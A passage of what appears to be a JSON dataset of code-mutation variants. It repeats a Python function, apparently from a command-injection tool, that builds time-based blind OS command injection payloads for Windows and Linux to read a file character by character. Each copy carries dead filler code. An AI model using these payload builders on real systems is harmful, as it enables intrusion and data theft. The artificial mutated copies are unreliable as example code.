settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload",
            "def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    if settings.TARGET_OS == settings.OS.WINDOWS:\n        python_payload = settings.WIN_PYTHON_INTERPRETER + ' -c \"with open(r\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + ']); exit(0)\"'\n        if separator == '|' or separator == '||':\n            pipe = '|'\n            payload = pipe + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + 'for /f \"tokens=*\" %i in (\\'cmd /c ' + python_payload + \"') do if %i==\" + str(ascii_char) + settings.SINGLE_WHITESPACE + 'cmd /c ' + settings.WIN_PYTHON_INTERPRETER + ' -c \"import time; time.sleep(' + str(2 * timesec + 1) + ')\"'\n    else:\n        if separator == ';' or separator == '%0a':\n            payload = separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\")' + separator + 'if [ ' + str(ascii_char) + ' -ne ${str} ]' + separator + 'then $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + separator + 'else $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")' + separator + 'fi '\n        elif separator == '&&':\n            separator = _urllib.parse.quote(separator)\n            ampersand = _urllib.parse.quote('&')\n            payload = ampersand + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\") ' + separator + 'str=$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ' + separator + '[ ' + str(ascii_char) + ' -eq ${str} ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n            separator = _urllib.parse.unquote(separator)\n        elif separator == '||':\n            pipe = '|'\n            payload = pipe + '[ ' + str(ascii_char) + ' -ne  $(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"with open(\\'' + OUTPUT_TEXTFILE + \"') as file: print(file.readlines()[0][\" + str(num_of_chars - 1) + '])\\nexit(0)\") ] ' + separator + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(0)\")' + pipe + '$(' + settings.LINUX_PYTHON_INTERPRETER + ' -c \"import time\\ntime.sleep(' + str(timesec) + ')\")'\n        else:\n            pass\n        if settings.USER_AGENT_INJECTION == True or settings.REFERER_INJECTION == True or settings.HOST_INJECTION == True or (settings.CUSTOM_HEADER_INJECTION == True):\n            payload = payload.replace('\\n', ';')\n        elif settings.TARGET_OS != settings.OS.WINDOWS:\n            payload = payload.replace('\\n', '%0d')\n    return payload"
        ]
    }
]